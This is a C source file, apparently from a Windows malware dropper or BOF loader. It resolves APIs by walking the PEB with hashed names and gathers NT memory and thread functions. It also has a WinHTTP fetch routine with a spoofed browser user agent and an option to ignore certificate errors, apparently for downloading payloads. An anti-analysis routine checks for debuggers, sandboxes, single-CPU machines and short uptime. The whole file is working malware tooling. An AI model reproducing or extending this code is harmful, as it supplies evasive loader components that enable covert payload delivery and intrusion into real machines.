/*
 * peb.c — PEB-based module/function resolution, tiny libc, NT/heap init.
 *
 * Derived from hostpayload_v2/src/dropper_template.c and kept self-contained
 * for -nostdlib MinGW builds.
 */

#include "bofloader.h"

/* -------------------------------------------------------------------------- */
/* Tiny libc                                                                    */
/* -------------------------------------------------------------------------- */

void MemSet(PVOID dst, BYTE v, SIZE_T n) {
    BYTE* p = (BYTE*)dst;
    while (n--) *p++ = v;
}

void MemCpy(PVOID dst, const void* src, SIZE_T n) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    while (n--) *d++ = *s++;
}

SIZE_T StrLenA(const char* s) {
    SIZE_T n = 0;
    while (s[n]) n++;
    return n;
}

int StrCmpA(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (BYTE)*a - (BYTE)*b;
}

int StrCmpNI(const char* a, const char* b, SIZE_T n) {
    while (n && *a && *b) {
        BYTE ca = (BYTE)*a, cb = (BYTE)*b;
        if (ca >= 'a' && ca <= 'z') ca -= 0x20;
        if (cb >= 'a' && cb <= 'z') cb -= 0x20;
        if (ca != cb) return (int)ca - (int)cb;
        a++; b++; n--;
    }
    return 0;
}

SIZE_T WStrLen(const WCHAR* s) {
    SIZE_T n = 0;
    while (s[n]) n++;
    return n;
}

int WStrCmpNI(const WCHAR* a, const WCHAR* b, SIZE_T n) {
    while (n && *a && *b) {
        WCHAR ca = *a, cb = *b;
        if (ca >= L'a' && ca <= L'z') ca -= 0x20;
        if (cb >= L'a' && cb <= L'z') cb -= 0x20;
        if (ca != cb) return (int)ca - (int)cb;
        a++; b++; n--;
    }
    return 0;
}

/* -------------------------------------------------------------------------- */
/* FNV1a-32 hash (case-insensitive)                                             */
/* -------------------------------------------------------------------------- */

ULONG HashStringW(const WCHAR* s, SIZE_T len) {
    ULONG h = H_MAGIC_KEY;
    SIZE_T i = 0;
    for (; i < len; i++) {
        WCHAR c = s[i];
        if (c >= L'a' && c <= L'z') c -= 0x20;
        if (c == L'\0') break;
        h ^= (BYTE)c;
        h *= H_MAGIC_PRIME;
    }
    return h;
}

ULONG HashStringA(const char* s, SIZE_T len) {
    ULONG h = H_MAGIC_KEY;
    SIZE_T i = 0;
    for (; i < len; i++) {
        BYTE c = (BYTE)s[i];
        if (c >= 'a' && c <= 'z') c -= 0x20;
        if (c == 0) break;
        h ^= c;
        h *= H_MAGIC_PRIME;
    }
    return h;
}

/* -------------------------------------------------------------------------- */
/* PEB module / function resolution                                             */
/* -------------------------------------------------------------------------- */

PVOID LdrModule(ULONG hash) {
    PPEB_LDR_DATA ldr = NtCurrentPeb()->Ldr;
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY cur = head->Flink;
    while (cur != head) {
        PLDR_DATA_TABLE_ENTRY ent = (PLDR_DATA_TABLE_ENTRY)cur;
        if (HashStringW(ent->BaseDllName.Buffer, ent->BaseDllName.Length / sizeof(WCHAR)) == hash)
            return ent->DllBase;
        cur = cur->Flink;
    }
    return NULL;
}

static PIMAGE_NT_HEADERS64 PeHeaders(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != 0x5A4D) return NULL;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return NULL;
    return nt;
}

PVOID LdrFunction(PVOID lib, ULONG hash) {
    PIMAGE_NT_HEADERS64 nt = PeHeaders(lib);
    if (!nt) return NULL;
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if (!exp_rva) return NULL;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)lib + exp_rva);
    DWORD* names = (DWORD*)((BYTE*)lib + exp->AddressOfNames);
    DWORD* funcs = (DWORD*)((BYTE*)lib + exp->AddressOfFunctions);
    WORD* ords = (WORD*)((BYTE*)lib + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)lib + names[i]);
        if (HashStringA(name, 0) == hash)
            return (PVOID)((BYTE*)lib + funcs[ords[i]]);
    }
    return NULL;
}

PVOID LoadDll(const WCHAR* name) {
    PVOID ntdll = LdrModule(H_NTDLL_DLL);
    if (!ntdll) return NULL;
    pLdrLoadDll LdrLoadDll = (pLdrLoadDll)LdrFunction(ntdll, H_LDRLOADDLL);
    if (!LdrLoadDll) return NULL;
    UNICODE_STRING us;
    WCHAR buf[64];
    SIZE_T i = 0;
    while (i < 63 && name[i]) { buf[i] = name[i]; i++; }
    buf[i] = 0;
    us.Buffer = buf;
    us.Length = (USHORT)(i * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);
    HANDLE h = NULL;
    if (NT_SUCCESS(LdrLoadDll(NULL, NULL, &us, &h)) && h)
        return h;
    return NULL;
}

/* -------------------------------------------------------------------------- */
/* NT API init                                                                  */
/* -------------------------------------------------------------------------- */

BOOL NtInit(NT_FUNCS* f) {
    MemSet(f, 0, sizeof(*f));
    PVOID ntdll = LdrModule(H_NTDLL_DLL);
    if (!ntdll) return FALSE;
    f->LdrLoadDll              = (pLdrLoadDll)LdrFunction(ntdll, H_LDRLOADDLL);
    f->NtAllocateVirtualMemory  = (pNtAllocateVirtualMemory)LdrFunction(ntdll, H_NTALLOCATEVIRTUALMEMORY);
    f->NtProtectVirtualMemory   = (pNtProtectVirtualMemory)LdrFunction(ntdll, H_NTPROTECTVIRTUALMEMORY);
    f->NtFreeVirtualMemory      = (pNtFreeVirtualMemory)LdrFunction(ntdll, H_NTFREEVIRTUALMEMORY);
    f->NtCreateThreadEx          = (pNtCreateThreadEx)LdrFunction(ntdll, H_NTCREATETHREADEX);
    f->NtWaitForSingleObject     = (pNtWaitForSingleObject)LdrFunction(ntdll, H_NTWAITFORSINGLEOBJECT);
    f->NtQuerySystemInformation   = (pNtQuerySystemInformation)LdrFunction(ntdll, H_NTQUERYSYSTEMINFORMATION);
    f->NtClose                   = (pNtClose)LdrFunction(ntdll, H_NTCLOSE);
    f->RtlAddFunctionTable       = (pRtlAddFunctionTable)LdrFunction(ntdll, H_RTLADDFUNCTIONTABLE);
    f->RtlDeleteFunctionTable    = (pRtlDeleteFunctionTable)LdrFunction(ntdll, H_RTLDELETEFUNCTIONTABLE);
    return f->LdrLoadDll && f->NtAllocateVirtualMemory && f->NtProtectVirtualMemory &&
           f->NtFreeVirtualMemory && f->NtCreateThreadEx;
}

/* -------------------------------------------------------------------------- */
/* Heap init                                                                    */
/* -------------------------------------------------------------------------- */

BOOL HeapInit(HEAP_FUNCS* f) {
    MemSet(f, 0, sizeof(*f));
    PVOID k32 = LdrModule(H_KERNEL32_DLL);
    if (!k32) return FALSE;
    f->GetProcessHeap = (pGetProcessHeap)LdrFunction(k32, H_GETPROCESSHEAP);
    f->HeapAlloc      = (pHeapAlloc)LdrFunction(k32, H_HEAPALLOC);
    f->HeapFree       = (pHeapFree)LdrFunction(k32, H_HEAPFREE);
    return f->GetProcessHeap && f->HeapAlloc;
}

/* -------------------------------------------------------------------------- */
/* WinHTTP fetch                                                                */
/* -------------------------------------------------------------------------- */

BYTE HTTP_CHUNK[4096];

BYTE* HttpFetch(const WCHAR* host, INTERNET_PORT port, const WCHAR* path,
                       int use_https, int ignore_cert, DWORD* out_len,
                       HTTP_FUNCS* hf, HEAP_FUNCS* heapf) {
    BYTE* buf = NULL;
    DWORD cap = 0, len = 0;
    PVOID session = NULL, connect = NULL, request = NULL;

    session = hf->WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto done;
    hf->WinHttpSetTimeouts(session, 0, 30000, 30000, 30000);

    connect = hf->WinHttpConnect(session, host, port, 0);
    if (!connect) goto done;

    request = hf->WinHttpOpenRequest(connect, L"GET", path, NULL,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     use_https ? WINHTTP_FLAG_SECURE : 0);
    if (!request) goto done;

    if (ignore_cert) {
        DWORD flags = SECURITY_IGNORE_ALL;
        hf->WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    if (!hf->WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        goto done;
    if (!hf->WinHttpReceiveResponse(request, NULL))
        goto done;

    DWORD avail = 0;
    while (hf->WinHttpQueryDataAvailable(request, &avail) && avail > 0) {
        DWORD to_read = avail > sizeof(HTTP_CHUNK) ? sizeof(HTTP_CHUNK) : avail;
        DWORD read = 0;
        if (!hf->WinHttpReadData(request, HTTP_CHUNK, to_read, &read) || read == 0)
            break;
        if (len + read > cap) {
            DWORD newcap = cap ? cap * 2 : 65536;
            while (newcap < len + read) newcap *= 2;
            BYTE* nb = (BYTE*)heapf->HeapAlloc(heapf->GetProcessHeap(), 0, newcap);
            if (!nb) goto done;
            if (buf) {
                MemCpy(nb, buf, len);
                heapf->HeapFree(heapf->GetProcessHeap(), 0, buf);
            }
            buf = nb;
            cap = newcap;
        }
        MemCpy(buf + len, HTTP_CHUNK, read);
        len += read;
    }

done:
    if (request) hf->WinHttpCloseHandle(request);
    if (connect) hf->WinHttpCloseHandle(connect);
    if (session) hf->WinHttpCloseHandle(session);
    *out_len = len;
    return buf;
}

/* -------------------------------------------------------------------------- */
/* Anti-analysis                                                                */
/* -------------------------------------------------------------------------- */

BOOL AntiCheck(void) {
    if (NtCurrentPeb()->BeingDebugged) return FALSE;

    /* Kernel-debugger state: class 35 via the loader's own resolver (the
     * caller's NT table isn't initialized yet) + KUSER_SHARED_DATA bit. */
    {
        pNtQuerySystemInformation qsi = NULL;
        PVOID ntdll = LdrModule(H_NTDLL_DLL);
        if (ntdll) qsi = (pNtQuerySystemInformation)LdrFunction(ntdll, H_NTQUERYSYSTEMINFORMATION);
        if (qsi) {
            struct { BOOLEAN Enabled; BOOLEAN NotPresent; } kd = { 0, 0 };
            if (NT_SUCCESS(qsi(35, &kd, sizeof(kd), NULL)) && kd.Enabled)
                return FALSE;
        }
    }
    if (*(BYTE*)((ULONG_PTR)0x7FFE0000 + 0xBA))
        return FALSE;

    PVOID k32 = LdrModule(H_KERNEL32_DLL);
    if (k32) {
        pGetSystemInfo gsi = (pGetSystemInfo)LdrFunction(k32, H_GETSYSTEMINFO);
        if (gsi) {
            SYSTEM_INFO si;
            MemSet(&si, 0, sizeof(si));
            gsi(&si);
            if (si.dwNumberOfProcessors < 2) return FALSE;
        }
        pGetTickCount64 gtc = (pGetTickCount64)LdrFunction(k32, H_GETTICKCOUNT64);
        if (gtc && gtc() < 180000) return FALSE;
    }
    return TRUE;
}
